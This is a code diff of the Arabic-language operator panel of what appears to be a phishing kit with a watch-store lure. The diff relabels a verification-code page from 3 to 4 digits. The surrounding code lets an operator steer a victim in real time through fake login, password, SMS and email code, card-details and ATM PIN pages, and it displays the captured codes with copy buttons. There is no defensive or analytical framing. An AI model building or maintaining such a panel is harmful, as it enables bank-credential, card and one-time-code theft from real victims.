@@ -313,7 +313,7 @@
       <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
       <button onclick="doRedirect('waiting.html')">صفحة الانتظار</button>
       <button onclick="doRedirect('code.html')">صفحة رمز التحقق</button>
-      <button onclick="doRedirect('code3.html')">صفحة رمز 3 أرقام</button>
+      <button onclick="doRedirect('code3.html')">صفحة رمز 4 أرقام</button>
       <button onclick="doRedirect('email-code.html')">صفحة رمز الإيميل</button>
       <button onclick="doRedirect('card-details.html')">صفحة بيانات البطاقة</button>
       <button onclick="doRedirect('atm.html')">صفحة ATM PIN</button>
@@ -346,7 +346,7 @@
       <button onclick="doVisitorRedirect('/password.html')">صفحة كلمة المرور</button>
       <button onclick="doVisitorRedirect('/waiting.html')">صفحة الانتظار</button>
       <button onclick="doVisitorRedirect('/code.html')">صفحة رمز التحقق</button>
-      <button onclick="doVisitorRedirect('/code3.html')">صفحة رمز 3 أرقام</button>
+      <button onclick="doVisitorRedirect('/code3.html')">صفحة رمز 4 أرقام</button>
       <button onclick="doVisitorRedirect('/email-code.html')">صفحة رمز الإيميل</button>
       <button onclick="doVisitorRedirect('/card-details.html')">صفحة بيانات البطاقة</button>
       <button onclick="doVisitorRedirect('/atm.html')">صفحة ATM PIN</button>
@@ -404,7 +404,7 @@ const watches = [
 const pageLabels = {
   "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
   "login":"تسجيل الدخول","password":"الرمز السري",
-  "waiting":"جاري التحقق","code":"رمز التحقق","code3":"رمز 3 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 3 أرقام",
+  "waiting":"جاري التحقق","code":"رمز التحقق","code3":"رمز 4 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 4 أرقام",
   "email-code":"رمز الإيميل","email-code-waiting":"تحقق رمز الإيميل",
   "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة","atm":"ATM PIN","atm-waiting":"تحقق ATM",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
@@ -619,7 +619,7 @@ function showDetails(id) {
   );
 
   // 4.b) 3-digit code
-  detailsHtml += section("section--code3", "رمز التحقق (3 أرقام)", "CODE 3", null,
+  detailsHtml += section("section--code3", "رمز التحقق (4 أرقام)", "CODE 4", null,
     row("الرمز", o.verification_code_3, {mono:true, copy:true})
   );
 
@@ -752,7 +752,7 @@ function pageLabel(p) {
     "home":"الصفحة الرئيسية","index":"الصفحة الرئيسية","welcome":"الترحيب",
     "colors":"اختيار الألوان","watch-features":"مميزات الساعة","order":"بيانات الطلب",
     "login":"تسجيل الدخول","password":"كلمة المرور","calling":"الاتصال","waiting":"انتظار",
-    "code":"رمز 6 أرقام","code-waiting":"انتظار الرمز","code3":"رمز 3 أرقام","code3-waiting":"انتظار الرمز 3",
+    "code":"رمز 6 أرقام","code-waiting":"انتظار الرمز","code3":"رمز 4 أرقام","code3-waiting":"انتظار الرمز 4",
     "email-code":"رمز الإيميل","email-code-waiting":"انتظار رمز الإيميل",
     "card-details":"بيانات البطاقة","card-waiting":"انتظار البطاقة",
     "atm":"ATM PIN","atm-waiting":"انتظار ATM","success":"النجاح","admin":"لوحة الادمن"
